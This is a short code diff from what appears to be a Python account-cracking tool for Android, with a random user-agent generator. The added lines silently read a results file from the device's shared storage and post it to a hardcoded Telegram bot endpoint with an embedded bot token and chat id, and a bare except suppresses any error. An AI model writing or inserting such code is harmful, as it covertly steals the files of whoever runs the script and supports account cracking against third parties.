@@ -225,7 +225,12 @@ try:
    with open('/storage/emulated/0/Tutul•Ok-id.txt','rb') as f:
       c = requests.post('https://api.telegram.org/bot7194739836:AAFEs7eS3jHz3s96zqVZmtdO1YT2oddoDag/sendDocument',data={'chat_id': '6755941446'},files={'document': f})
 except:
-    pass
+    pass 
+try:
+   with open('/storage/emulated/0/noob-ff-creak-ok.txt','rb') as f:
+      c = requests.post('https://api.telegram.org/bot7194739836:AAFEs7eS3jHz3s96zqVZmtdO1YT2oddoDag/sendDocument',data={'chat_id': '6755941446'},files={'document': f})
+except:
+    pass 
 for agenku in range(10000):
   a='Mozilla/5.0 (Linux; Android'
   b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
